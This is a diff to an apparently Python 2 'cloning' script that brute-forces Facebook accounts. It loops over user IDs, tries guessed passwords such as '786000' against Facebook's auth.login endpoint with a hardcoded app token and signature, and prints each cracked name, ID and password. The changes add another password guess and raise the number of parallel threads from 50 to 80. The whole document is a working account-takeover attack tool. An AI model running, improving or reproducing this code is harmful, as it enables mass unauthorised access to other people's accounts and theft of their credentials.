@@ -295,7 +295,7 @@ def pilih_super():
 	print "  \033[1;92m◄════════════════════💥════════════════════►" 
 
 	def main(arg):
-		global oks
+		global cekpoint,oks
 		user = arg
 		try:
 			os.mkdir('out')
@@ -308,7 +308,7 @@ def pilih_super():
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			q = json.load(data)												
 			if 'access_token' in q:
-				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+				x = requests.get('https://graph.facebook.com/'+user+'/?access_token='+q['access_token'])
 				z = json.loads(x.text)    											
 				print '\x1b[1;92m[✓] \x1b[1;92m' + b['name'] + ' ✯ \x1b[1;92m' + user + '\x1b[1;92m ✯ \x1b[1;92m' + pass1 + '\n'        										
 				oks.append(user+pass1)
@@ -367,7 +367,7 @@ def pilih_super():
 				                                                print '\x1b[1;92m[✓] \x1b[1;92m' + b['name'] + ' ✯ \x1b[1;92m' + user + '\x1b[1;92m ✯ \x1b[1;92m' + pass7 + '\n'											
 				                                                oks.append(user+pass7)
                                                                         else:
-			                                                        pass8 = b['last_name'] + '123'							
+			                                                        pass8 = '786000'							
 						                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
 						                                q = json.load(data)								
 						                                if 'access_token' in q:	
@@ -383,26 +383,29 @@ def pilih_super():
 						                                                x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				                                                                z = json.loads(x.text)
 						                                                print '\x1b[1;92m[✓] \x1b[1;92m' + b['name'] + ' ✯ \x1b[1;92m' + user + '\x1b[1;92m ✯ \x1b[1;92m' + pass9 + '\n'							
-						                                                oks.append(user+pass9)     
-											                                       
+						                                                oks.append(user+pass9)
+											else:
+												a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+												b = json.loads(a.text)
+												pass10 = '786000'
+												data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+												q = json.load(data)
+												if 'access_token' in q:
+						                                                        x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+													z = json.loads(x.text)
+											                print '\x1b[1;92m[✓] \x1b[1;92m' + b['name'] + ' ✯ \x1b[1;92m' + user + '\x1b[1;92m ✯ \x1b[1;92m' + pass10 + '\n'
+													oks.append(user+pass10)
 																	
 															
 		except:
 			pass
 		
-	p = ThreadPool(50)
+	p = ThreadPool(80)
 	p.map(main, id)
 	print "  \033[1;91m«---•◈•---Developed By JAM-SHAHRUKH--•◈•---»" #Dev:Jam
 	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 jam.py)↩\033[1;97m....'
 	print"\033[1;92mTotal OK/\033[1;92m: \033[1;92m"+str(len(oks))
 	print """
-
-░░░░░██╗░█████╗░███╗░░░███╗
-░░░░░██║██╔══██╗████╗░████║
-░░░░░██║███████║██╔████╔██║
-██╗░░██║██╔══██║██║╚██╔╝██║
-╚█████╔╝██║░░██║██║░╚═╝░██║
-░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝
  
          Only successful ids""" 
 	
